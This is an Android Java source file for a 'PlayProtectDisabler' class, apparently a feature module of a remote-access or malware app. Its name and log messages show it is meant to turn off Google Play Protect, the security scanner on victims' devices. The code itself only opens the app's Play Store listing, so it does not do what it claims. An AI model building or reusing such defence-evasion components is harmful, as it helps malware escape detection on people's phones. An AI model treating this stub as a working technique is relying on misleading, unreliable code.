package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.xrc.system.core.Constants;

public class PlayProtectDisabler {
    private static final String TAG = Constants.TAG + ":PP";
    private static PlayProtectDisabler instance;
    private final Context ctx;

    private PlayProtectDisabler(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized PlayProtectDisabler get(Context ctx) {
        if (instance == null) instance = new PlayProtectDisabler(ctx);
        return instance;
    }

    public void disable() {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("market://details?id=" + ctx.getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.i(TAG, "Opened Play Store for this app");
        } catch (Exception e) {
            Log.e(TAG, "Disable Play Protect failed", e);
        }
    }
}
